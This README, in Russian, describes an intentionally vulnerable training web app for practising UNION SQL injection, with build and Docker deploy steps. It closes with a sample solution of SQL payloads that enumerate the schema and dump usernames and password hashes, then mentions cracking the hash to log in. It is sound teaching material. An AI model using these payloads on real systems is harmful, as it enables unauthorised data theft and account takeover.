# UNION SQL-инъекция

Данное веб-приложение создано для демонстрации простой UNION SQL-инъекции и представляет собой тренировочное задание. Его цель — разместить новость на главной странице сайта.

Можно добавить элемент соревнования и проводить выполнение задания несколькими людьми на скорость, кто первый запостит новость со своим именем, тот и победил.

Приложение оформлено в виде Docker-образа, однако может использоваться и отдельно.


## Сборка из исходных кодов

**Системные требования:**

* GNU Make
* Node.js, NPM
* PHP

**Как собирать:**

```sh
make
```

Результаты сборки помещаются в папку `build`. Проект поддерживает параллелизацию сборки (`make -jN`).


## Развёртывание и использование

```sh
cd build && docker build .
docker container create <id_образа>
docker container start <id_контейнера>
```

Веб-сервер будет прослушивать HTTP на порте 80.


## Пример решения задания

Уязвимым является поле поиска новостей.

1. Подбор количества полей в исходном запросе:

    ```sql
    … UNION SELECT 1,2,3,4,5 -- foo
    ```

2. Получения имени базы данных:

    ```sql
    … UNION SELECT 1,DATABASE(),3,4,5 -- bar
    ```

3. Получение таблиц данной базы данных:

    ```sql
    … UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='sqlinj' -- baz
    ```

4. Получение столбцов таблиц:

    ```sql
    … UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema='sqlinj' AND table_name='config' -- spam
    … UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema='sqlinj' AND table_name='nyoows' -- tuna
    … UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema='sqlinj' AND table_name='uzwers' -- fish
    ```

5. Получение списка пользователей:

    ```sql
    … UNION SELECT 1,username,password,4,5 FROM uzwers -- moo
    ```

6. Ломаем хеш, заходим под пользователем, размещаем новость.
7. ?????
8. PROFIT!
